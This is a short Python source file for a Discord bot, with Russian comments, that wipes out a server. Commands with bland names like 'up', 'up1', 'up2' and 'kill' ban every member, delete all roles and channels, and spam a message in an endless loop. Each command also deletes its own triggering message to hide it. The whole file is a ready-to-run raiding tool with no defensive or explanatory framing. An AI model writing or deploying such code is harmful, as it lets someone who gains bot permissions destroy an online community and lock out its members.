import discord
from discord.ext import commands
import asyncio

client = discord.Client() 

client = commands.Bot(command_prefix = '!') # префикс

@client.event
async def on_ready():
    print('Bot enabled')


@client.command()
async def up(ctx): # удаление участников
    await ctx.message.delete()
    for m in ctx.guild.members:
        try:
            await m.ban()
        except:
            pass

@client.command()
async def up1(ctx): # удаление ролей
    await ctx.message.delete()
    for m in ctx.guild.roles:
        try:
            await m.delete()
        except:
            pass

@client.command()
async def up2(ctx): # удаление чатов
    await ctx.message.delete()
    failed = []
    counter = 0
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)

@client.command()
async def upx(ctx, arg): # спам 1 строки (работает плохо из-за защиты дс)
    await ctx.message.delete()

    i = 1
    while i == 1:
        await ctx.send(arg)

@client.command()
async def kill(ctx): # это просто ужас
    await ctx.message.delete()
    for m in ctx.guild.roles:
        try:
            await m.delete()
        except:
            pass
   
    for m in ctx.guild.members:
        try:
            await m.ban()
        except:
            pass

    failed = []
    counter = 0
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)




token = open('token.txt', 'r').readline()

client.run(token) 

# а где мои алмазы? _-_
